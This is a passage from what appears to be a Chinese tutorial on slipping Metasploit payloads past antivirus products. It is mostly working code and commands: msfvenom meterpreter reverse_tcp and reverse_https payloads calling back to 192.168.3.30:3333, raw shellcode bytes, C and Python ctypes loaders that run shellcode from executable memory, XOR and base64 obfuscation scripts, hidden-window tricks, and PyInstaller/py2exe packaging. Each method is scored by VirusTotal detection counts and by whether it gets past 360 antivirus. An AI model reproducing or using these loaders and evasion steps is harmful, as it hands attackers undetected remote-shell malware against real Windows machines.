cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">0</span>, <span class="hljs-number">4</span>)];            *(p + <span class="hljs-number">2</span>) = base64_alphabet[cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">4</span>, <span class="hljs-number">2</span>) + cmove_bits(*(indata + <span class="hljs-number">2</span>), <span class="hljs-number">0</span>, <span class="hljs-number">6</span>)];            *(p + <span class="hljs-number">3</span>) = base64_alphabet[*(indata + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3f</span>];        &#125;        p += <span class="hljs-number">4</span>;        indata += <span class="hljs-number">3</span>;    &#125;    <span class="hljs-keyword">if</span> (outlen != NULL) &#123;        *outlen = out_len;    &#125;    <span class="hljs-keyword">return</span> ret;&#125;<span class="hljs-built_in">int</span> base64_decode(<span class="hljs-keyword">const</span> char *indata, <span class="hljs-built_in">int</span> inlen, char *outdata) &#123;    <span class="hljs-built_in">int</span> ret = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> (indata == NULL || inlen &lt;= <span class="hljs-number">0</span> || outdata == NULL ) &#123;        <span class="hljs-keyword">return</span> ret = <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-keyword">if</span> (inlen % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 需要解码的数据不是4字节倍数</span>        <span class="hljs-keyword">return</span> ret = <span class="hljs-number">-2</span>;    &#125;    <span class="hljs-built_in">int</span> t = <span class="hljs-number">0</span>, x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>, i = <span class="hljs-number">0</span>;    unsigned char c = <span class="hljs-number">0</span>;    <span class="hljs-built_in">int</span> g = <span class="hljs-number">3</span>;    <span class="hljs-keyword">while</span> (indata[x] != <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">// 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span>        c = base64_suffix_map[indata[x++]];        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-comment">// 对应的值不在转码表中</span>        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">253</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">// 对应的值是换行或者回车</span>        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">254</span>) &#123; c = <span class="hljs-number">0</span>; g--; &#125;<span class="hljs-comment">// 对应的值是&#x27;=&#x27;</span>        t = (t &lt;&lt; <span class="hljs-number">6</span>) | c; <span class="hljs-comment">// 将其依次放入一个int型中占3字节</span>        <span class="hljs-keyword">if</span> (++y == <span class="hljs-number">4</span>) &#123;            outdata[i++] = (unsigned char)((t &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>);            <span class="hljs-keyword">if</span> (g &gt; <span class="hljs-number">1</span>) outdata[i++] = (unsigned char)((t &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>);            <span class="hljs-keyword">if</span> (g &gt; <span class="hljs-number">2</span>) outdata[i++] = (unsigned char)(t &amp; <span class="hljs-number">0xff</span>);            y = t = <span class="hljs-number">0</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> ret;&#125;</code></pre><p>base64.h</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">ifndef base64_h</span><span class="hljs-meta">#</span><span class="bash">define base64_h</span><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><span class="hljs-meta">#</span><span class="bash"><span class="hljs-keyword">if</span> __cplusplus</span>extern &quot;C&quot; &#123;<span class="hljs-meta">#</span><span class="bash">endif</span>    int base64_encode(const char *indata, int inlen, char *outdata, int *outlen);    int base64_decode(const char *indata, int inlen, char *outdata);<span class="hljs-meta">#</span><span class="bash"><span class="hljs-keyword">if</span> __cplusplus</span>&#125;<span class="hljs-meta">#</span><span class="bash">endif</span><span class="hljs-meta">#</span><span class="bash">endif /* base64_h */</span></code></pre><p>shellcode.c</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;Windows.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;base64.h&quot;</span></span>unsigned char buf[] =&quot;msf base64 code&quot;;int main(int argc, const char * argv[]) &#123;    char str3[1000] = &#123; 0 &#125;;    //printf(&quot;%s &quot;, buf);    base64_decode(buf, (int)strlen(buf), str3);    //printf(&quot;%d  &quot;, sizeof(str3));    char *Memory;    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, str3, sizeof(str3));    ((void(*)())Memory)();    return 0;&#125;</code></pre><p>使用msf生成base64编码的shellcode</p><pre><code class="hljs angelscript">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.30</span> lport=<span class="hljs-number">3333</span>  -f c &gt; shell.c</code></pre><p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。</p><p>使用gcc进行编译</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">shellcode</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">base64</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.exe</span></code></pre><p>执行exe即可上线</p><h4 id="8-python变形shellcode-汇编代码-未能复现成功"><a href="#8-python变形shellcode-汇编代码-未能复现成功" class="headerlink" title="8.python变形shellcode+汇编代码(未能复现成功)"></a>8.python变形shellcode+汇编代码(未能复现成功)</h4><p>msf生成shellcode（就用这种吧，其他的下面脚本会报错）</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</code></pre><p>python2环境，需要安装capstone和keystone-engine包。使用脚本对shellcode进行变形<code>https://github.com/sayhi2urmom/shellcodeseperator/blob/master/main.py</code></p><p>将脚本中的<code>CODE = b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;     </code>替换为shell.c的shellcode</p><pre><code class="hljs shell">root@kali:~/webtools/BypassAntiVirus/encode_shellcode_python# python encode_shellcode.pyunsigned char buf[]=&#123;0x90, 0xbb, 0x71, 0xe3, 0xaa, 0x34, 0x90, 0xdb, 0xcf, 0x90, 0xd9, 0x74, 0x24, 0xf4, 0x90, 0x58, 0x90, 0x29, 0xc9, 0x90, 0xb1, 0x59, 0x90, 0x83, 0xe8, 0xfc, 0x90, 0x31, 0x58, 0x10, 0x90, 0x3, 0x58, 0x10, 0x90, 0x93, 0x90, 0x66, 0x16, 0x90, 0x56, 0x90, 0xdc, 0xdc, 0x90, 0xd9, 0xa7, 0x1d, 0x82, 0x50, 0x42, 0x90, 0x2c, 0x90, 0x90, 0x66, 0x7, 0x90, 0x66, 0x6, 0x90, 0x1d, 0x24, 0x43, 0x4a, 0xae, 0x90, 0xcf, 0x90, 0x1, 0x7f, 0x25, 0x90, 0xbd, 0x8d, 0x4e, 0xc6, 0x4e, 0x90, 0x79, 0xe1, 0x90, 0x66, 0x1e, 0x90, 0x61, 0x90, 0x45, 0x90, 0x57&#125;;</code></pre><p>再在vs2019中编译以下文件</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fucku __asm&#123;mov eax,eax&#125;</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="hljs-comment">//windows控制台程序不出黑窗口</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(*pfunc)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = &#123;&#125;;    fucku;    BYTE* sc = (BYTE*)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf) + <span class="hljs-number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    fucku;    fucku;    <span class="hljs-comment">//memcpy(sc,buf,sizeof(buf));</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(buf); i++) &#123;        fucku;        sc[i] = buf[i];    &#125;    pfunc shellcode = (pfunc)sc;    __asm &#123;        push shellcode        ret    &#125;    <span class="hljs-comment">//HANDLE lpThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)shellcode,NULL,0,NULL);</span>    <span class="hljs-comment">//WaitForSingleObject(lpThread,-1);</span>&#125;</code></pre><h4 id="9-python-xor处理（VT-20-70-不能过360）"><a href="#9-python-xor处理（VT-20-70-不能过360）" class="headerlink" title="9.python+xor处理（VT:20/70 不能过360）"></a>9.python+xor处理（VT:20/70 不能过360）</h4><p>msf生成shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</code></pre><p>python生成xor代码</p><pre><code class="hljs shell">import reraw = r&quot;&quot;&quot;unsigned char buf[] =&quot;shellcode;&quot;&quot;&quot;regx = re.compile(r&quot;\\x\w\w&quot;)arr = re.findall(regx,raw)for i in range(0,len(arr)):    arr[i] = arr[i].replace(&quot;\\&quot;,&quot;0&quot;)data = &quot;&quot;&quot;<span class="hljs-meta">#</span><span class="bash">include &lt;windows.h&gt;</span><span class="hljs-meta">#</span><span class="bash">pragma comment(linker, <span class="hljs-string">&quot;/subsystem:\\&quot;</span>windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;<span class="hljs-string">&quot;)</span></span>void test()&#123;    unsigned char buf[333];&quot;&quot;&quot;data = data + &quot;    &quot;print(len(arr))for i in range(len(arr)):    data = data + &quot;buf[&quot;+ str(i) +&quot;] = &quot; + arr[i] + &quot;^ 0x5f ^ 0x5f;&quot;    if(i%100 == 0):        data = data + &quot;\r\n    &quot;data = data + &quot;&quot;&quot;    ((void(*)(void))&amp;buf)();&#125;int main(int argc, char* argv[])&#123;    test();    return 0;&#125;&quot;&quot;&quot;f = open(&quot;shellcode.txt&quot;,&quot;w&quot;)f.write(data)</code></pre><p>再将生成<code>shellcode.txt</code>内容粘贴到vs2019中进行编译（注意1关闭DEP：调试-project调制属性-链接器-高级-DEP,注意2关闭优化：调试-project调制属性-C/C++-优化）</p><h3 id="2-shellcode加载器"><a href="#2-shellcode加载器" class="headerlink" title="2.shellcode加载器"></a>2.shellcode加载器</h3><h4 id="1-使用shellcode-launcher（过不了微软）"><a href="#1-使用shellcode-launcher（过不了微软）" class="headerlink" title="1.使用shellcode_launcher（过不了微软）"></a>1.使用shellcode_launcher（过不了微软）</h4><p>github项目地址：<a href="https://github.com/clinicallyinane/shellcode_launcher">https://github.com/clinicallyinane/shellcode_launcher</a></p><p>msf生成raw格式的shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw -o shellcode.raw</code></pre><p>在目标机器上用shellcode_launcher.exe执行</p><pre><code class="hljs shell">shellcode_launcher.exe -i shellcode.raw</code></pre><p>msf会正常上线。</p><h4 id="2-使用SSI加载-VT-24-71-过360"><a href="#2-使用SSI加载-VT-24-71-过360" class="headerlink" title="2.使用SSI加载(VT:24/71 过360)"></a>2.使用SSI加载(VT:24/71 过360)</h4><p>msf生成c文件</p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.3.30 LPORT=3333 -f c -o msf.txt</code></pre><p>然后执行下面命令,会得到一串16进制字符串</p><pre><code class="hljs shell">root@kali:~# cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#x27;:a;N;$!ba;s/\n//g&#x27;|sed &quot;s/;//g&quot;fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5</code></pre><p>然后使用win上的i686-w64-mingw32-gcc配合SimpleShellcodeInjector.c编译生成ssi.exe</p><pre><code class="hljs shell">F:\mingw-w64\setting\mingw32\bin&gt;i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe</code></pre><p>其实在<code>SimpleShellcodeInjector\OLDBinary</code>文件中也有个ssi.exe，这是作者给编译好的，不过不建议使用，因为这个ssi.exe已经能被很多杀软查杀，最好就是使用上面的命令自己编译一个。使用编译生成的ssi.exe，参数为上面的16进制字符串，执行shellcode，msf可正常上线</p><pre><code class="hljs shell">F:\mingw-w64\setting\mingw32\bin&gt;ssi.exe fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5</code></pre><h2 id="2-python（文件比较大，不合适）"><a href="#2-python（文件比较大，不合适）" class="headerlink" title="2.python（文件比较大，不合适）"></a>2.python（文件比较大，不合适）</h2><p><a href="https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA">https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA</a></p><h3 id="1-通过py源码编译exe"><a href="#1-通过py源码编译exe" class="headerlink" title="1  通过py源码编译exe"></a>1  通过py源码编译exe</h3><h4 id="1-python加载C代码（VT-8-69-过360）"><a href="#1-python加载C代码（VT-8-69-过360）" class="headerlink" title="1.python加载C代码（VT:8/69 过360）"></a>1.python加载C代码（VT:8/69 过360）</h4><p>msf生成c文件</p><pre><code class="hljs shell">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c[*] exec: msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of c file: 1512 bytesunsigned char buf[] = &quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;&quot;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28&quot;&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1&quot;&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x03\x1e\x68\x02&quot;&quot;\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</code></pre><p>python代码</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">import</span> ctypesshellcode = bytearray(<span class="hljs-string">&quot;shellcode&quot;</span>)ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>),                                          ctypes.c_int(len(shellcode)),                                          ctypes.c_int(<span class="hljs-number">0x3000</span>),                                          ctypes.c_int(<span class="hljs-number">0x40</span>))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),                                     buf,                                     ctypes.c_int(len(shellcode)))ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="hljs-number">0</span>),                                         ctypes.c_int(<span class="hljs-number">0</span>),                                         ctypes.c_int(ptr),                                         ctypes.c_int(<span class="hljs-number">0</span>),                                         ctypes.c_int(<span class="hljs-number">0</span>),                                         ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(<span class="hljs-number">-1</span>))</code></pre><p>然后要使用PyInstaller将上述py文件转为exe（3.4M左右）</p><pre><code class="hljs shell">python pyinstaller.py -F pyshellcode.py</code></pre><p>执行生成的exe，msf正常上线</p><h4 id="2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用"><a href="#2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用" class="headerlink" title="2.py2exe打包编译exe(VT: 6/70 过360 蜜汁闪退？？？会弹黑框不建议使用)"></a>2.py2exe打包编译exe(VT: 6/70 过360 蜜汁闪退？？？会弹黑框不建议使用)</h4><p>该方法借用了免杀工具<code>Python-Rootkit</code>的思路。</p><p>首先要在windows上安装x86版的python。</p><p><strong>注意：必须使用x86版本Python 2.7,即使Windows是x64的，也要安装32位版本。</strong></p><p>这里安装的是Python 2.7.16 x86 windows版：</p><p><a href="https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi">https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi</a></p><p>之后安装32位Py2exe for python 2.7</p><p><a href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download">https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download</a></p><p>msfvenom生成python payload</p><pre><code class="hljs routeros">msfvenom -p python/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.3.30  <span class="hljs-attribute">LPORT</span>=3333  -f<span class="hljs-built_in"> raw </span>-o shell.py</code></pre><p>创建文件setup.py</p><pre><code class="hljs shell">from distutils.core import setupimport py2exesetup(name = &quot;Meter&quot;,description = &quot;Python-based App&quot;,version = &quot;1.0&quot;,console = [&quot;shell.py&quot;],options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,zipfile = None)raw_input()</code></pre><p>在windows下执行<code>python.exe .\setup.py py2exe</code>，(文件大小11M)</p><p>msf开启监听，即可上线</p><h4 id="3-base64编码-失败。。。"><a href="#3-base64编码-失败。。。" class="headerlink" title="3.base64编码(失败。。。)"></a>3.base64编码(失败。。。)</h4><p>msfvenom生成shellcode</p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64  LHOST=192.168.3.30 LPORT=3333   -f c</code></pre><p>python代码如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<span class="hljs-keyword">import</span> base64encode_shellcode = <span class="hljs-string">&quot;shellcode&quot;</span>shellcode = base64.b64decode(encode_shellcode)rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(shellcode), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, rwxpage, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)</code></pre><p>使用pyinstaller编译打包exe(6.2m）</p><pre><code class="hljs shell">pyinstaller -F -w pyshellcode.py</code></pre><h4 id="4-py-C编译exe-失败。。"><a href="#4-py-C编译exe-失败。。" class="headerlink" title="4.py+C编译exe(失败。。)"></a>4.py+C编译exe(失败。。)</h4><p>先用msfvenom生成shellcode:</p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -f c</code></pre><p>python代码如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypesbuf =  <span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">#libc = CDLL(&#x27;libc.so.6&#x27;)</span>PROT_READ = <span class="hljs-number">1</span>PROT_WRITE = <span class="hljs-number">2</span>PROT_EXEC = <span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">executable_code</span>(<span class="hljs-params">buffer</span>):</span>    buf = c_char_p(buffer)    size = len(buffer)    addr = libc.valloc(size)    addr = c_void_p(addr)    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> == addr:         <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Failed to allocate memory&quot;</span>)    memmove(addr, buf, size)    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Failed to set protection on buffer&quot;</span>)    <span class="hljs-keyword">return</span> addrVirtualAlloc = ctypes.windll.kernel32.VirtualAllocVirtualProtect = ctypes.windll.kernel32.VirtualProtectshellcode = bytearray(buf)whnd = ctypes.windll.kernel32.GetConsoleWindow()   <span class="hljs-keyword">if</span> whnd != <span class="hljs-number">0</span>:       <span class="hljs-keyword">if</span> <span class="hljs-number">1</span>:              ctypes.windll.user32.ShowWindow(whnd, <span class="hljs-number">0</span>)                 ctypes.windll.kernel32.CloseHandle(whnd)memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>),                                          ctypes.c_int(len(shellcode)),                                          ctypes.c_int(<span class="hljs-number">0x3000</span>),                                          ctypes.c_int(<span class="hljs-number">0x40</span>))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)old = ctypes.c_long(<span class="hljs-number">1</span>)VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="hljs-number">0x40</span>,ctypes.byref(old))ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),                                     buf,                                     ctypes.c_int(len(shellcode)))shell = cast(memorywithshell, CFUNCTYPE(c_void_p))shell()</code></pre><p>使用pyinstaller编译打包exe，生成文件大小3.4M</p><pre><code class="hljs shell">pyinstaller -F -w pyshellcode.py</code></pre><h4 id="5-xor加密（失败。。）"><a href="#5-xor加密（失败。。）" class="headerlink" title="5.xor加密（失败。。）"></a>5.xor加密（失败。。）</h4><p>先用msfvenom生成一个raw格式的shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</code></pre><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p><pre><code class="hljs shell">python shellcode_encoder.py -py shellcode.raw se_null xor</code></pre><p>使用pyinstaller编译上一步骤中成的encryptedShellcodeWrapper_xor.py</p><pre><code class="hljs shell">pyinstaller --onefile --noconsole 